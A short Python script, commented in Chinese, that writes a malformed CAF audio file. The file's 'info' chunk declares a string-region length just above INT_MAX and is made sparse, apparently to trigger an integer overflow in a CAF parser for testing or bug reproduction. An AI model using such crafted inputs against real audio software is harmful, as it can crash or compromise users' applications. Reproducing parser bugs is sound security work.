import os, struct

fn = "caf_info_big.caf"

# 让 info 的“字符串区长度”刚好超过 INT_MAX
strings_len = 0x8000000C          # 2147483660
info_chunk_size = strings_len + 4 # info chunk 总大小（包含 count）

def be16(x): return struct.pack(">H", x)
def be32(x): return struct.pack(">I", x)
def be64(x): return struct.pack(">Q", x)

with open(fn, "wb") as f:
    # CAF file header
    f.write(b"caff")
    f.write(be16(1))   # version
    f.write(be16(0))   # flags

    # desc chunk
    f.write(b"desc")
    f.write(be64(32))

    f.write(struct.pack(">d", 44100.0))  # sample rate
    f.write(b"lpcm")                     # format id
    f.write(be32(0))                     # fmt_flags: big-endian integer PCM
    f.write(be32(2))                     # bytes per packet
    f.write(be32(1))                     # frames per packet
    f.write(be32(1))                     # channels
    f.write(be32(16))                    # bits per channel

    # info chunk
    f.write(b"info")
    f.write(be64(info_chunk_size))
    f.write(be32(1))                     # count

    # 跳过超大字符串区，做成 sparse
    f.seek(strings_len, os.SEEK_CUR)

    # data chunk（最小合法占位）
    f.write(b"data")
    f.write(be64(4))
    f.write(be32(0))                     # edit count

print("wrote", fn)